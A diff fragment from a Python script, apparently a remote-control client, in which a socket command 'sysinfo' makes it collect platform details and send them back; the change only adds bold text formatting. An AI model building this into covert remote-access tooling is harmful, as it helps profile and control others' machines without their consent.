@@ -39,9 +39,9 @@ def recieveCommands():
         data = s.recv(8192)
         if data[:].decode("utf-8") == 'sysinfo':
             try:
-                systemInfo = ('\n' + CYAN + 'Machine: ' + END + GREEN + platform.machine() + END + '\n' + CYAN + 'Version: ' + END + GREEN + platform.version() + END + '\n'
-                + CYAN + 'Platform: ' + END + GREEN + platform.platform() + END + '\n' + CYAN + 'System: '
-                + END + GREEN + platform.system() + END + '\n' + CYAN + 'Processor: ' + END + GREEN + platform.processor() + END + '\n')
+                systemInfo = ('\n' + CYAN + 'Machine: ' + END + GREEN + BOLD + platform.machine() + END + '\n' + CYAN + 'Version: ' + END + GREEN + BOLD + platform.version() + END + '\n'
+                + CYAN + 'Platform: ' + END + GREEN + BOLD + platform.platform() + END + '\n' + CYAN + 'System: '
+                + END + GREEN + BOLD + platform.system() + END + '\n' + CYAN + 'Processor: ' + END + GREEN + BOLD + platform.processor() + END + '\n')
                 str(systemInfo)
                 s.send(str.encode(systemInfo))
             except:
